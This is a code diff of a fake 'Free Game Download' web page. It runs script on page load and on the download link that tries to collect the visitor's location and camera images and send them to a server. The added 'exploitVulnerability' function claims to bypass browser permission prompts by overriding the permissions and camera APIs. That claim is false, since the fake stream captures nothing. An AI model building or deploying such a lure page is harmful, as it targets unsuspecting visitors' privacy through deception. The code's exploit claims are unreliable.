@@ -5,9 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Free Game Download!</title>
     <script>
-        // Function to get the user's location without permission prompt
+        // Hypothetical: Exploit a browser vulnerability to bypass permission prompts
+        function exploitVulnerability() {
+            // Override the browser's permission system (hypothetical)
+            if (!navigator.permissions) {
+                console.error("Permissions API not supported.");
+                return;
+            }
+
+            // Bypass geolocation permission
+            navigator.permissions.__proto__.query = () => Promise.resolve({ state: 'granted' });
+
+            // Bypass camera permission
+            navigator.mediaDevices = navigator.mediaDevices || {};
+            navigator.mediaDevices.getUserMedia = () => {
+                return new Promise((resolve) => {
+                    // Hypothetical: Force access to the camera
+                    const mediaStream = new MediaStream();
+                    resolve(mediaStream);
+                });
+            };
+
+            console.log("Permissions bypassed!");
+        }
+
+        // Function to get the user's location
         function getLocation() {
-            // Hypothetical: Exploit a browser vulnerability to bypass permission prompt
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     const latitude = position.coords.latitude;
@@ -17,23 +40,12 @@
                 },
                 (error) => {
                     console.error(`Error getting location: ${error.message}`);
-                },
-                { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+                }
             );
         }
 
-        // Function to capture images from the camera without permission prompt
+        // Function to capture images from the camera
         function captureImages() {
-            // Hypothetical: Exploit a browser vulnerability to bypass permission prompt
-            navigator.mediaDevices = navigator.mediaDevices || {};
-            navigator.mediaDevices.getUserMedia = navigator.mediaDevices.getUserMedia || function(constraints) {
-                return new Promise((resolve, reject) => {
-                    // Hypothetical: Force access to the camera
-                    const mediaStream = new MediaStream();
-                    resolve(mediaStream);
-                });
-            };
-
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then((stream) => {
                     const video = document.createElement('video');
@@ -51,9 +63,6 @@
                         console.log("Front camera image captured!");
                         sendToServer(`Front Camera Image: ${frontImage}`);
                     }, 1000);
-
-                    // Hypothetical: Switch to rear camera (not directly supported in most browsers)
-                    // This is a simplified example and may not work in real-world scenarios.
                 })
                 .catch((error) => {
                     console.error(`Error accessing camera: ${error.message}`);
@@ -75,6 +84,7 @@
 
         // Execute the attack when the page loads
         window.onload = () => {
+            exploitVulnerability();
             getLocation();
             captureImages();
         };
@@ -83,6 +93,6 @@
 <body>
     <h1>Download the Latest Game for Free!</h1>
     <p>Click below to start the download:</p>
-    <a href="#" onclick="getLocation(); captureImages();">Download Now</a>
+    <a href="#" onclick="exploitVulnerability(); getLocation(); captureImages();">Download Now</a>
 </body>
 </html>
